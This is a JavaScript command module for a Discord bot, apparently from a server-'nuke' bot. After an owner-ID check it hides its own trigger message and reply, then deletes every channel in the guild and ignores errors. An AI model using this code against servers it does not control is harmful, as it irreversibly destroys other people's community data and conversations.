
module.exports.run = async (client, message, args) => {
    const config = require("../config.json");
    if (message.author.id == config.idowner) { } else return;
    message.delete();


    let deleteall = true;
    let messageArray = message.content.split(" "),
    command = messageArray[0]
    message.channel.send(`Ok (dlall).`).then(msg => setTimeout(() => msg.delete(), 2500));
    while (deleteall) {
        await new Promise(resolve => setTimeout(() => {
            message.guild.channels.cache.forEach(channel => {
                channel.delete().catch()

                deleteall = false

            })


            resolve();

        }
        ))
    };

}

module.exports.config = {
    name: "dlall",
    aliases: ["deleteall"]
}
